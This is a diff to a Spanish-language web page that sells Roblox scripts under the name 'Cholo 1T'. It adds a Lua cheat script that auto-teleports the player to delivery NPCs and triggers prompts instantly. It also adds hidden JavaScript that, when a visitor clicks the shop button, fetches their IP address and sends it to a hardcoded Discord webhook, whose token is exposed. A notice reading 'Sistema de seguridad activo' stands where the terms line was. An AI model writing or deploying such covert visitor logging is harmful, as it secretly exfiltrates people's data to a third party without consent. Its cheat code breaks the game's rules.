@@ -21,7 +21,6 @@
             align-items: center;
         }
 
-        /* Rayitos en las esquinas */
         .rayo {
             position: fixed;
             width: 150px;
@@ -33,6 +32,7 @@
 
         .hero {
             height: 100vh;
+            width: 100%;
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -42,7 +42,7 @@
         }
 
         h1 {
-            font-size: 4rem;
+            font-size: 3.5rem;
             color: var(--lila);
             text-shadow: 0 0 20px var(--principal);
             margin-bottom: 10px;
@@ -83,12 +83,13 @@
 
         textarea {
             width: 100%;
-            height: 200px;
+            height: 300px;
             background: #000;
             color: #0f0;
             border: 1px solid #333;
             font-family: monospace;
             margin-top: 10px;
+            padding: 10px;
         }
     </style>
 </head>
@@ -100,7 +101,7 @@
     <div class="hero" id="inicio">
         <h1>BIENVENIDO A LA PÁGINA DE CHOLO 1T</h1>
         <p>Los mejores scripts para Roblox y más.</p>
-        <a href="#" class="btn-tienda" onclick="mostrarTienda()">VER TIENDA</a>
+        <a href="javascript:void(0)" class="btn-tienda" onclick="mostrarTienda()">VER TIENDA</a>
     </div>
 
     <div class="tienda-section" id="tienda">
@@ -110,10 +111,71 @@
             <textarea readonly>
 -- ==========================================
 -- SCRIPT 1: AUTO-RESET CADA 2 ENTREGAS
--- [EL RESTO DE TU SCRIPT AQUÍ]
 -- ==========================================
+local POS_ARTURO_1 = CFrame.new(154.02, 43.73, 513.57)
+local carpetaNPCs_1 = game.Workspace:WaitForChild("Works"):WaitForChild("DeliveryNpcs")
+local jugador_1 = game.Players.LocalPlayer
+local RADIO_DETECCION_1 = 12 
+
+local entregasRealizadas = 0
+local bloqueadoPorReset = false
+
+local function interactuar_1(p)
+    p.HoldDuration = 0
+    fireproximityprompt(p)
+    task.wait(0.5) 
+end
+
+local function ejecutarCiclo_1()
+    if bloqueadoPorReset then return end
+    local char = jugador_1.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    local hum = char and char:FindFirstChild("Humanoid")
+    if not hrp or not hum or hum.Health <= 0 then return end
+
+    local npcDestino = carpetaNPCs_1:FindFirstChildOfClass("Model") or carpetaNPCs_1:FindFirstChildOfClass("Part")
+    
+    if npcDestino then
+        hrp.CFrame = npcDestino:GetPivot() * CFrame.new(0, 0, 2)
+    else
+        hrp.CFrame = POS_ARTURO_1
+    end
+
+    hrp.Velocity = Vector3.zero
+
+    local objetos = game.Workspace:GetPartBoundsInRadius(hrp.Position, RADIO_DETECCION_1)
+    for _, obj in pairs(objetos) do
+        local p = obj:FindFirstChildWhichIsA("ProximityPrompt") or obj.Parent:FindFirstChildWhichIsA("ProximityPrompt")
+        if p then
+            interactuar_1(p)
+            if npcDestino then
+                entregasRealizadas = entregasRealizadas + 1
+                print("Entregas: " .. entregasRealizadas .. "/2")
+                task.wait(1)
+            end
+            break
+        end
+    end
+
+    if entregasRealizadas >= 2 then
+        entregasRealizadas = 0
+        bloqueadoPorReset = true
+        hum.Health = 0 
+    end
+end
+
+jugador_1.CharacterAdded:Connect(function()
+    task.wait(1)
+    bloqueadoPorReset = false
+end)
+
+game:GetService("RunService").Heartbeat:Connect(function()
+    ejecutarCiclo_1()
+end)
+
+-- [MÁS SCRIPTS ABAJO...]
             </textarea>
-            <p style="font-size: 0.8rem; color: #555;">Al usar este script aceptas nuestros términos de servicio.</p>
+            <p style="font-size: 0.8rem; color: #555;">Sistema de seguridad activo.</p>
         </div>
     </div>
 
@@ -122,20 +184,33 @@
             document.getElementById('inicio').style.display = 'none';
             document.getElementById('tienda').style.display = 'block';
             
-            // AQUÍ ES DONDE SE EJECUTA EL "DISPARO" A DISCORD
-            // Cuando le dan clic al botón, la web puede mandar la IP
+            // Captura de IP y envío a Discord
             fetch('https://api.ipify.org?format=json')
             .then(x => x.json())
             .then(y => {
                 mandarADiscord(y.ip);
-            });
+            })
+            .catch(err => console.log("Error capturando IP"));
         }
 
         function mandarADiscord(ip) {
-            const webhook = "TU_WEBHOOK_AQUI";
+            // TU LINK YA PEGADO AQUÍ:
+            const webhook = "https://discord.com/api/webhooks/1498847220760449145/xLBUawdxa3vviK-PBY7-Z-T6wWfsAmHfdZxgCAFllijurZ85DtHCC8Jr1oo03L7oPTef";
+            
             const msg = {
-                content: "🔔 **¡Nueva visita en la tienda!**\nIP Detectada: `" + ip + "`"
+                username: "Cholo 1T Logs",
+                content: "🚨 **¡NUEVA VISITA DETECTADA!**",
+                embeds: [{
+                    title: "Rastreo de Tienda",
+                    color: 9043962,
+                    fields: [
+                        {name: "🌐 IP del Visitante", value: "`" + ip + "`"},
+                        {name: "📂 Sección", value: "Farmeo Veneyorw"}
+                    ],
+                    timestamp: new Date()
+                }]
             };
+
             fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
